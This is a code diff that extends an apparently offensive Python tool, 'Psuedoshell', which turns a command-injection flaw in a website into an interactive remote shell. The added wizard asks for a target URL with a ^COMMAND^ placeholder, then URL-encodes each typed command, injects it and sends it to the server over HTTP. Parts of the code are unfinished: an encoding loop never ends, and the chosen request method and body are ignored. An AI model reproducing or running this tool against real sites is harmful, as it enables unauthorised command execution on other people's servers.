@@ -1,10 +1,10 @@
 import requests
-from pynput import keyboard
-from time import sleep
 import sys
 import termios
 import tty
 import subprocess
+import argparse
+import encoders
 
 class Injector:
     def __init__(self, url, request_type, encoding_type=None, body=None):
@@ -18,13 +18,18 @@ class Injector:
         self.url_encoding_mask = url_encoding_mask
         self.body_encoding_mask = body_encoding_mask
     def inject_command(self, command):
-        self.url = self.url.replace("COMMAND", command)
-        self.request_type = self.request_type.replace("COMMAND", command)
-        self.body = self.body.replace("COMMAND", command)
+        command = encoders.urlencode(command)
+        self.url = self.url.replace("^COMMAND^", command)
+        if self.body != None:
+            self.body = self.body.replace("^COMMAND^", command)
     def encode_url(self):
         spliturl = []
         while "ENCS" in self.url_encoding_mask:
             pass
+    def send_command(self, command):
+        self.inject_command(command)
+        response = requests.get(self.url)
+        return response.text
 
 class History:
     def __init__(self):
@@ -123,10 +128,26 @@ class Shell:
 def shell_run_command(command):
     return subprocess.check_output(command, shell=True, text=True)
 
-def send_command(injector):
-    response = requests.get(injector.url)
-    return response.text
 
 if __name__ == "__main__":
-    shell = Shell(shell_run_command)
+    parser = argparse.ArgumentParser(prog="Psuedoshell", description="A smart shell that isn't a shell, but can be used to turn single command injections on webpages into a shell")
+    parser.add_argument("--wizard", help="enables the wizard to give an interactive setup", action="store_true")
+    args = parser.parse_args()
+    shell = None
+    if args.wizard:
+        print("Welcome to the psuedo shell wizard, here we will help you set up your shell")
+        print("")
+        print("When answering the following questions, please enter ^COMMAND^ at the place you want your command injected")
+        print("The ^COMMAND^ will then be replaced by your command when sending it")
+        print("Right lets begin!")
+        print("")
+        url = input("What is the url: ")
+        method = input("What method is the request: ")
+        body = None
+        if method == "PUT" or method == "POST":
+            body = input("What is the body of the request")
+        injector = Injector(url, method, body=body)
+        shell = Shell(injector.send_command)
+    else:
+        shell = Shell(shell_run_command)
     shell.run()
